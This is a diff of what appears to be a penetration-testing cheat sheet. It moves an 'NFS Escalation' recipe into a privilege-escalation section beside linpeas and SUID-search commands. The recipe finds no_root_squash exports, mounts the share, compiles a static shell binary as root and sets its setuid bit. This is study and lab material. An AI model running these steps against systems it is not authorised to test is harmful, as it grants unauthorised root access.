@@ -307,7 +307,17 @@ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas
 find / -perm +6000 2>/dev/null | grep '/bin/'
 ````
 
-- Usefull links :
+- NFS Escalation
+````
+cat /etc/exports
+-> search for no_root_squash
+showmount -e 10.10.240.191
+sudo mount -t nfs -o rw <IP_TARGET>:/<SHARED> <LOCAL_DIR>
+sudo gcc main.c -o shell -w -static
+sudo chmod +s shell
+````
+
+### Usefull links :
 
 - [GTFOBINS](https://gtfobins.github.io/)
 
@@ -532,16 +542,6 @@ export TERM=xterm-256-color
 ----
 
 ## Usefull bash commands
-
-- NFS
-````
-cat /etc/exports
--> search for no_root_squash
-showmount -e 10.10.240.191
-sudo mount -t nfs -o rw <IP_TARGET>:/<SHARED> <LOCAL_DIR>
-sudo gcc main.c -o shell -w -static
-sudo chmod +s shell
-````
 
 - Find writable folder
 ````
